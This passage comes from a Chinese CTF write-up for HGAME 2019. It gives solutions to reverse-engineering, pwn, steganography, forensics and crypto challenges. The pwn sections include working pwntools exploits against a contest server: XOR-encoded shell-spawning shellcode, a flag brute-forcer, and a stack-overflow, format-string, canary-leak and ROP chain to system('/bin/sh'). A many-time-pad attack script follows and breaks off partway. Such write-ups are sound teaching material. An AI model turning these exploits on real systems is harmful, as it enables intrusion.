&quot;&quot;</span><br><span class="line">for i in range(35):</span><br><span class="line">    t += chr(ord(s[i]) ^ d[i])</span><br><span class="line">print(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>flag: hgame{X0r_1s_interest1ng_isn’t_it?}</p><h2 id="Pro的Python教室-一"><a href="#Pro的Python教室-一" class="headerlink" title="Pro的Python教室(一)"></a>Pro的Python教室(一)</h2><p>把代码中的 enc2 BASE64 解密即可。</p><p>flag: hgame{Here_1s_3asy_Pyth0n}</p><h2 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h2><p>主函数代码不能正常 F5，提示有一处 call 分析失败，将它 nop 掉之后再 F5 ，得到如下伪代码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[92]; // [rsp+0h] [rbp-60h]</span><br><span class="line">  int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  signal(14, (__sighandler_t)handle);</span><br><span class="line">  alarm(0xAu);</span><br><span class="line">  read(0, buf, 80uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 79; ++i )</span><br><span class="line">    buf[i] ^= i + 1;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大概的意思就是把输入进行异或加密，最后的 call 应该是跳转到用户的输入继续执行。<br>先把输入的 shellcode 异或就行。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10000</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">new_shellcode = &quot;&quot;</span><br><span class="line">for i in range(len(shellcode)):</span><br><span class="line">    new_shellcode += chr(ord(shellcode[i]) ^ (i + 1))</span><br><span class="line">print(new_shellcode)</span><br><span class="line">p.sendline(new_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>flag: hgame{Baby_Baby_S0_E4ay!}</p><h2 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h2><p>连上去输入 100 个 a 就可以了。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./babysc&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  9999</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;a&quot; * 100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>flag: hgame{Aa4_4aA_4a4aAAA}</p><h2 id="薯片拯救世界1"><a href="#薯片拯救世界1" class="headerlink" title="薯片拯救世界1"></a>薯片拯救世界1</h2><p>除了那些花里胡哨的东西之外，逻辑就是先把 flag 读取到一个全局变量里面，然后进入一个循环，要求我们输入 flag，并且使用 strncmp 函数和 flag 比较。<br>由于比较的字节数是由 strlen 确定的，可以通过控制输入长度来爆破 flag。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./CSTW&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10001</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line"># context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Ch1p Save The World--Chapter 1\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;...\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;魔王的封印在2000年后的今天终于被解开\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;人类又到了生死存亡的最后关头\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(&quot;——Ch1p\n&quot;)</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">token = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&quot;</span><br><span class="line">for i in range(len(token)):</span><br><span class="line">    flag += token[i]</span><br><span class="line">    print(&quot;Trying: %s&quot; % flag)</span><br><span class="line">    p.recvuntil(&quot;为此，大祭司必须念出当年约定的那串咒语——\n&quot;)</span><br><span class="line">    p.send(flag + &quot;\x00&quot;)</span><br><span class="line">    result = p.recv(6)</span><br><span class="line">    if &quot;......&quot; in result:</span><br><span class="line">        flag = &quot;hgame&#123;Ch1p_1s_&quot;</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;FOUND : %s&quot; % flag)</span><br><span class="line">        break</span><br><span class="line"># p.interactive()</span><br></pre></td></tr></table></figure></div><p>flag: hgame{Ch1p_1s_Awakking!}</p><h2 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h2><p>这道题考察的东西比较多，类似闯关一样分成四关，第一关代码如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_4008F6()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-40h]</span><br><span class="line">  int v2; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;To seek the truth of the world.&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x80uLL);</span><br><span class="line">  if ( v2 != 9011 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>要求 v2 &#x3D;&#x3D; 9011，通过上面的 read 栈溢出控制 v2，但是不能直接控制返回地址，因为程序开启了 canary。<br>第二关代码：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400958()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST0C_4</span><br><span class="line">  char buf; // [rsp+10h] [rbp-40h]</span><br><span class="line">  char v3; // [rsp+14h] [rbp-3Ch]</span><br><span class="line">  int v4; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v0 = v4;</span><br><span class="line">  puts(&quot;Repeater is nature of man.&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  puts(&quot;You found it?&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x34uLL);</span><br><span class="line">  if ( v4 - 4660 != v0 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过格式化字符串漏洞泄露出 rand 出的数值，然后栈溢出控制 v4 满足要求。<br>第三关：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_400A00()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-20h]</span><br><span class="line">  char v3; // [rsp+15h] [rbp-1Bh]</span><br><span class="line">  unsigned __int64 v4; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Payment of past debts.&quot;);</span><br><span class="line">  read(0, &amp;buf, 5uLL);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  if ( v1 != 26214 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里通过动态调试发现，v1 的值正好在上一关中 buf 的范围内，所以在上一关就构造好 payload 满足这里的条件，之后利用 5 字节的格式化字符串漏洞泄露 canary。<br>最后一关和第一关一样，不同的是已经拿到了 canary，构造满足条件的 payload 然后栈溢出即可。<br>程序中有 system 函数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_400A76(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return system(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>只需要找一个 pop rdi, ret 的 gadget</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import unlink</span><br><span class="line"></span><br><span class="line">binary = &quot;./SteinsGate&quot;</span><br><span class="line">ip = &quot;118.24.3.214&quot;</span><br><span class="line">port =  10002</span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">if local == 1:</span><br><span class="line">    p = process(binary)</span><br><span class="line">if local == 0:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;What&#x27;s your ID:&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line">payload1 = &quot;a&quot; * 0x30 + p64(0x2333)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(&quot;Repeater is nature of man.\n&quot;)</span><br><span class="line">payload2 = &quot;%7$p&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(payload2)</span><br><span class="line">rand = int(p.recv(17),16) &gt;&gt; 28</span><br><span class="line">log.info(&quot;Rand : %x&quot; % rand)</span><br><span class="line">p.recvuntil(&quot;You found it?\n&quot;)</span><br><span class="line">payload3 = &quot;aaaaaaaabbbbbbbbccccccccddddff\x00\x00eeeeeeeeffffffff&quot; + p32(rand + 0x1234)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(&quot;Payment of past debts.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.send(&quot;%11$p&quot;)</span><br><span class="line">canary = int(p.recv(18),16)</span><br><span class="line">payload4 = &quot;a&quot; * 0x30 + p64(0x2333) + p64(canary) + &quot;b&quot; * 8 + p64(0x0000000000400c73) + p64(0x602040) + p64(0x400a76)</span><br><span class="line">p.recvuntil(&quot;To seek the truth of the world.\n&quot;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>flag: hgame{El_PsY_C0NgrOO}</p><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>简单的 LSB 隐写，用 stegsolve 打开就可以看到 flag。</p><p>flag: hgame{LSB_is_easy_for_u}</p><h2 id="打字机"><a href="#打字机" class="headerlink" title="打字机"></a>打字机</h2><p>给出了两张图片<br><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-3.png" alt="image"></p><p><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-4.png" alt="image"></p><p>第一张看上去像某种打字机，然后打出了 flag，谷歌识图之后发现这个打字机是某部动画片里的？<br>在知乎上找到一篇<a class="link" target="_blank" rel="noopener" href="https://www.zhihu.com/question/266139542/answer/303595744">文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-5.png" alt="image"></p><p><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-6.png" alt="image"></p><p>通过这两张图片慢慢看(猜)就能看(猜)出 flag。(打字机上印的是大写，而 flag 中有小写字母…)</p><p>flag: hgame{My_vi0let_tyPewRiter}</p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>压缩包题目，不能正常解压，用 010 editor 打开看到压缩包头部的 PK 变成了 OK，改回来之后再解压(密码在 winrar 右面的注释栏里面 S0mETh1ng_U5efuL)，即可得到 flag。</p><p>flag: hgame{Cra2y_D1aM0nd}</p><h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>首先分析流量包，从里面提取出一个压缩包 dec.zip，解压后是另外一个带有密码的压缩包和 password.txt，提示密码是 hgame 后面跟着 8 个不知道是什么的字符。<br>猜测是 8 位数字，用 ZIP 密码破解工具的掩码模式破解出密码 hgame25839421<br>出来一张图片，binwalk 还可以从图片提取出来另一个压缩包，直接解压需要密码，使用 winrar 修复压缩包之后就可以正常解压了，最后得到一个 word 文档，将后缀名改成 zip 解压出来一堆文件，在 word 文件夹下的 document.xml 中找到 flag。</p><p>flag: hgame{59d28413e36019861498e823f3f41406}</p><h2 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h2><p>摩斯密码 –&gt; 十六进制转字符串 –&gt; 栅栏密码解密 –&gt; 凯撒密码解密</p><p>flag: hgame{E4sY_cRypt0}</p><h2 id="perfect-secrecy"><a href="#perfect-secrecy" class="headerlink" title="perfect_secrecy!"></a>perfect_secrecy!</h2><p>提示 OTP 密码，即一次性密码本，银行的一些动态口令使用的就是 OTP 加密。<br>给出的脚本如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def strxor(a, b):</span><br><span class="line">    return &quot;&quot;.join(hex(x ^ y)[2:].zfill(2) for (x, y) in zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fp = open(&#x27;poem.txt&#x27;, &#x27;rb&#x27;)</span><br><span class="line">flag = &quot;*********************************&quot;</span><br><span class="line">strings = fp.readlines()</span><br><span class="line">key = hex(random.randint(2**511, 2**512))[2:]    # 从 2^511 到 2^512 取随机数   OTP 密钥</span><br><span class="line">strs = [strxor(i[:-3], binascii.unhexlify(key)) for i in strings]</span><br><span class="line">result = strxor(flag.encode(&#x27;utf-8&#x27;), binascii.unhexlify(key))</span><br><span class="line">print(strs)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">output:</span><br><span class="line">[&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span class="line">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><p>大概意思就是声明了一个随机数作为 OTP 的密钥，用同一个密钥将一首诗和 flag 进行加密。<br>google 一圈发现了几道类似的题目，基本思想是 OTP 虽然安全，但是如果一个密钥被用来加密许多明文的话，就面临很大的风险了，有一种攻击叫做 cribdrag，就是专门用来攻击 OTP 类似的密码的。<br>在 github 上面可以找到 cribdrag，但是用在这道题目上并不好使，我找到了另外一个脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><br><span class="line"># @author intrd - http://dann.com.br/ </span><br><span class="line"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">import collections</span><br><span class="line">import sets, sys</span><br><span class="line"></span><br><span class="line"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span><br><span class="line">#ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line">ciphers = [&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">           &#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">           &#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">           &#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">           &#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">           &#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">           &#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">           &#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">           &#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span class="line">           &#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">           